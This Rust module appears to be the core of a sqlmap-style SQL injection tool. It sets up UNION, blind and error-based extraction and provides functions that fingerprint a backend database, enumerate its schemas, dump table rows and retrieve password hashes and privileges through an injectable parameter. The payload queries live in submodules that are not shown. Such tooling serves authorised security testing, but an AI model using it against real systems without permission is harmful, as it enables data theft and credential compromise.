//! SQL Injection Data Extraction Engine
//!
//! Provides data extraction capabilities similar to sqlmap:
//! - UNION-based extraction
//! - Boolean-based blind extraction  
//! - Time-based blind extraction
//! - Error-based extraction

pub mod union_extract;
pub mod blind_extract;
pub mod error_extract;
pub mod queries;

use crate::http::client::HttpClient;
use crate::sqli::DatabaseType;
use url::Url;

/// Extraction configuration
#[derive(Debug, Clone)]
pub struct ExtractionConfig {
    /// Maximum rows to extract per table
    pub max_rows: usize,
    /// Starting row offset
    pub start_row: usize,
    /// Specific columns to extract
    pub columns: Option<Vec<String>>,
    /// Extraction technique preference
    pub technique: ExtractionTechnique,
    /// Number of threads for blind extraction
    pub threads: usize,
}

impl Default for ExtractionConfig {
    fn default() -> Self {
        Self {
            max_rows: 100,
            start_row: 0,
            columns: None,
            technique: ExtractionTechnique::Auto,
            threads: 1,
        }
    }
}

impl ExtractionConfig {
    pub fn with_limit(mut self, start: usize, stop: Option<usize>) -> Self {
        self.start_row = start;
        if let Some(s) = stop {
            self.max_rows = s - start;
        }
        self
    }

    pub fn with_columns(mut self, cols: Vec<String>) -> Self {
        self.columns = Some(cols);
        self
    }
}

/// Extraction technique
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ExtractionTechnique {
    /// Automatically choose best technique
    Auto,
    /// UNION-based extraction (fastest)
    Union,
    /// Boolean-based blind extraction
    BooleanBlind,
    /// Time-based blind extraction
    TimeBlind,
    /// Error-based extraction
    ErrorBased,
}

/// Database information
#[derive(Debug, Clone, Default)]
pub struct DatabaseInfo {
    pub db_type: Option<DatabaseType>,
    pub version: Option<String>,
    pub current_user: Option<String>,
    pub current_db: Option<String>,
    pub hostname: Option<String>,
    pub is_dba: Option<bool>,
}

impl std::fmt::Display for DatabaseInfo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // Calculate dynamic width based on longest value
        let mut max_len = 30; // minimum width
        
        if let Some(db) = &self.db_type {
            max_len = std::cmp::max(max_len, format!("{:?}", db).len());
        }
        if let Some(v) = &self.version {
            max_len = std::cmp::max(max_len, v.len());
        }
        if let Some(u) = &self.current_user {
            max_len = std::cmp::max(max_len, u.len());
        }
        if let Some(d) = &self.current_db {
            max_len = std::cmp::max(max_len, d.len());
        }
        if let Some(h) = &self.hostname {
            max_len = std::cmp::max(max_len, h.len());
        }
        
        let content_width = max_len + 18; // 18 = "  DBMS Type    : " (longest label)
        let border = "═".repeat(content_width);
        
        writeln!(f, "╔{}╗", border)?;
        writeln!(f, "║{:^width$}║", "DATABASE INFORMATION", width = content_width)?;
        writeln!(f, "╠{}╣", border)?;
        
        if let Some(db) = &self.db_type {
            let line = format!("  DBMS Type    : {:?}", db);
            writeln!(f, "║{:<width$}║", line, width = content_width)?;
        }
        if let Some(v) = &self.version {
            let line = format!("  Version      : {}", v);
            writeln!(f, "║{:<width$}║", line, width = content_width)?;
        }
        if let Some(u) = &self.current_user {
            let line = format!("  Current User : {}", u);
            writeln!(f, "║{:<width$}║", line, width = content_width)?;
        }
        if let Some(d) = &self.current_db {
            let line = format!("  Current DB   : {}", d);
            writeln!(f, "║{:<width$}║", line, width = content_width)?;
        }
        if let Some(h) = &self.hostname {
            let line = format!("  Hostname     : {}", h);
            writeln!(f, "║{:<width$}║", line, width = content_width)?;
        }
        if let Some(dba) = &self.is_dba {
            let line = format!("  Is DBA       : {}", if *dba { "Yes" } else { "No" });
            writeln!(f, "║{:<width$}║", line, width = content_width)?;
        }
        
        writeln!(f, "╚{}╝", border)
    }
}

/// Database user credential
#[derive(Debug, Clone)]
pub struct DbCredential {
    pub username: String,
    pub password_hash: Option<String>,
    pub privileges: Vec<String>,
    pub roles: Vec<String>,
}

/// Extracted table data
#[derive(Debug, Clone)]
pub struct TableData {
    pub database: String,
    pub table: String,
    pub columns: Vec<String>,
    pub rows: Vec<Vec<String>>,
}

impl TableData {
    pub fn to_csv(&self) -> String {
        let mut output = self.columns.join(",");
        output.push('\n');
        for row in &self.rows {
            output.push_str(&row.join(","));
            output.push('\n');
        }
        output
    }

    pub fn to_table(&self) -> String {
        let mut output = String::new();
        
        // Calculate column widths
        let mut widths: Vec<usize> = self.columns.iter().map(|c| c.len()).collect();
        for row in &self.rows {
            for (i, cell) in row.iter().enumerate() {
                if i < widths.len() && cell.len() > widths[i] {
                    widths[i] = cell.len();
                }
            }
        }
        
        // Header
        let header_line: String = widths.iter().map(|w| "-".repeat(*w + 2)).collect::<Vec<_>>().join("+");
        output.push_str(&format!("+{}+\n", header_line));
        
        let header: String = self.columns.iter().enumerate()
            .map(|(i, c)| format!(" {:width$} ", c, width = widths[i]))
            .collect::<Vec<_>>().join("|");
        output.push_str(&format!("|{}|\n", header));
        output.push_str(&format!("+{}+\n", header_line));
        
        // Rows
        for row in &self.rows {
            let row_str: String = row.iter().enumerate()
                .map(|(i, c)| format!(" {:width$} ", c, width = widths.get(i).unwrap_or(&10)))
                .collect::<Vec<_>>().join("|");
            output.push_str(&format!("|{}|\n", row_str));
        }
        output.push_str(&format!("+{}+\n", header_line));
        
        output
    }
}

/// Main extraction result
#[derive(Debug, Clone)]
pub struct ExtractionResult {
    pub info: DatabaseInfo,
    pub databases: Vec<String>,
    pub tables: std::collections::HashMap<String, Vec<String>>,
    pub columns: std::collections::HashMap<String, std::collections::HashMap<String, Vec<String>>>,
    pub data: Vec<TableData>,
    pub credentials: Vec<DbCredential>,
}

impl Default for ExtractionResult {
    fn default() -> Self {
        Self {
            info: DatabaseInfo::default(),
            databases: Vec::new(),
            tables: std::collections::HashMap::new(),
            columns: std::collections::HashMap::new(),
            data: Vec::new(),
            credentials: Vec::new(),
        }
    }
}

/// Main extractor that coordinates extraction techniques
pub struct Extractor {
    pub db_type: DatabaseType,
    pub config: ExtractionConfig,
}

impl Extractor {
    pub fn new(db_type: DatabaseType) -> Self {
        Self {
            db_type,
            config: ExtractionConfig::default(),
        }
    }

    pub fn with_config(mut self, config: ExtractionConfig) -> Self {
        self.config = config;
        self
    }

    /// Get database information (version, user, hostname, etc.)
    pub async fn get_info(
        &self,
        client: &HttpClient,
        url: &Url,
        param: &str,
    ) -> anyhow::Result<DatabaseInfo> {
        let mut info = DatabaseInfo {
            db_type: Some(self.db_type),
            ..Default::default()
        };

        // Try UNION-based first, fall back to blind
        if let Ok(Some(version)) = union_extract::extract_single(
            client, url, param, &queries::version_query(self.db_type)
        ).await {
            info.version = Some(version);
        }

        if let Ok(Some(user)) = union_extract::extract_single(
            client, url, param, &queries::current_user_query(self.db_type)
        ).await {
            info.current_user = Some(user);
        }

        if let Ok(Some(db)) = union_extract::extract_single(
            client, url, param, &queries::current_db_query(self.db_type)
        ).await {
            info.current_db = Some(db);
        }

        if let Ok(Some(host)) = union_extract::extract_single(
            client, url, param, &queries::hostname_query(self.db_type)
        ).await {
            info.hostname = Some(host);
        }

        Ok(info)
    }

    /// Enumerate all databases
    pub async fn get_databases(
        &self,
        client: &HttpClient,
        url: &Url,
        param: &str,
    ) -> anyhow::Result<Vec<String>> {
        let query = queries::databases_query(self.db_type);
        union_extract::extract_list(client, url, param, &query).await
    }

    /// Enumerate tables in a database
    pub async fn get_tables(
        &self,
        client: &HttpClient,
        url: &Url,
        param: &str,
        database: &str,
    ) -> anyhow::Result<Vec<String>> {
        let query = queries::tables_query(self.db_type, database);
        union_extract::extract_list(client, url, param, &query).await
    }

    /// Enumerate columns in a table
    pub async fn get_columns(
        &self,
        client: &HttpClient,
        url: &Url,
        param: &str,
        database: &str,
        table: &str,
    ) -> anyhow::Result<Vec<String>> {
        let query = queries::columns_query(self.db_type, database, table);
        union_extract::extract_list(client, url, param, &query).await
    }

    /// Dump table data
    pub async fn dump_table(
        &self,
        client: &HttpClient,
        url: &Url,
        param: &str,
        database: &str,
        table: &str,
        columns: Option<Vec<String>>,
    ) -> anyhow::Result<TableData> {
        let cols = if let Some(c) = columns {
            c
        } else {
            self.get_columns(client, url, param, database, table).await?
        };

        let query = queries::dump_query(self.db_type, database, table, &cols);
        let rows = union_extract::extract_rows(
            client, url, param, &query,
            self.config.start_row,
            self.config.max_rows,
        ).await?;

        Ok(TableData {
            database: database.to_string(),
            table: table.to_string(),
            columns: cols,
            rows,
        })
    }

    /// Get database users
    pub async fn get_users(
        &self,
        client: &HttpClient,
        url: &Url,
        param: &str,
    ) -> anyhow::Result<Vec<String>> {
        let query = queries::users_query(self.db_type);
        union_extract::extract_list(client, url, param, &query).await
    }

    /// Get password hashes
    pub async fn get_passwords(
        &self,
        client: &HttpClient,
        url: &Url,
        param: &str,
    ) -> anyhow::Result<Vec<DbCredential>> {
        let query = queries::passwords_query(self.db_type);
        let rows = union_extract::extract_rows(client, url, param, &query, 0, 100).await?;
        
        let creds = rows.into_iter().map(|row| {
            DbCredential {
                username: row.get(0).cloned().unwrap_or_default(),
                password_hash: row.get(1).cloned(),
                privileges: Vec::new(),
                roles: Vec::new(),
            }
        }).collect();

        Ok(creds)
    }

    /// Get user privileges
    pub async fn get_privileges(
        &self,
        client: &HttpClient,
        url: &Url,
        param: &str,
    ) -> anyhow::Result<Vec<(String, String)>> {
        let query = queries::privileges_query(self.db_type);
        let rows = union_extract::extract_rows(client, url, param, &query, 0, 100).await?;
        
        let privs = rows.into_iter().map(|row| {
            (
                row.get(0).cloned().unwrap_or_default(),
                row.get(1).cloned().unwrap_or_default(),
            )
        }).collect();

        Ok(privs)
    }
}

